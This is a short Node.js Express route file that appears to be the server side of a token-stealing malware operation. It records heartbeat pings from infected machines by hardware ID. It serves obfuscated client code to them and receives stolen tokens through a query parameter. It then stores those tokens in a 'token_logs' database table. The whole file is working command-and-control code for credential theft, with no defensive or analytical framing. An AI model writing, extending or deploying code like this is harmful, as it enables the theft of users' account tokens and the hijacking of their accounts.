const { getObfuscatedClientCode } = require('../../util/obfuscator.js');
const { getShortHwid } = require('../../util/util.js');

const logger = require('../../util/logger');

module.exports = (app) => {
    // pinging / last ping per client
    app.get('/p/:hwid', (req, res) => {
        const hwid = req.params.hwid;

        app.lastPings[hwid] = Date.now();
        logger.info(`${getShortHwid(hwid)} has pinged.`);

        res.status(200).send('');
    });

    // get client code
    app.get('/c/:hwid', (req, res) => {
        logger.info(`Sending client code to ${req.params.hwid}.`);
        res.send(getObfuscatedClientCode());
    });

    // upload token(s)
    app.get('/u/:hwid', (req, res) => {
        const hwid = req.params.hwid;
        let tokens = req.query.t;

        logger.info(`Receiving token(s) from ${hwid}.`);

        // make sure it's sha256 hashed
        if (hwid.length == 64 && tokens != null) {
            try {
                tokens = JSON.parse(tokens);
            } catch (e) {
                logger.info(`Error JSON parsing tokens: ${e}.`);
                logger.info(`Raw: ${req.query.t}`);
                res.status(200).send('');
                return;
            }

            if (tokens.find((t) => JSON.parse(t).token) != null) {
                app.db.prepare('INSERT INTO token_logs (date, hwid, tokens) VALUES (?, ?, ?)').run(Date.now(), hwid, JSON.stringify(tokens));
                logger.info(`Successfuly received token(s) from ${hwid}.`);
            } else {
                logger.info('No token found in keys.');
                logger.info(`Raw: ${req.query.t}`);
            }
        }

        res.status(200).send('');
    });
};
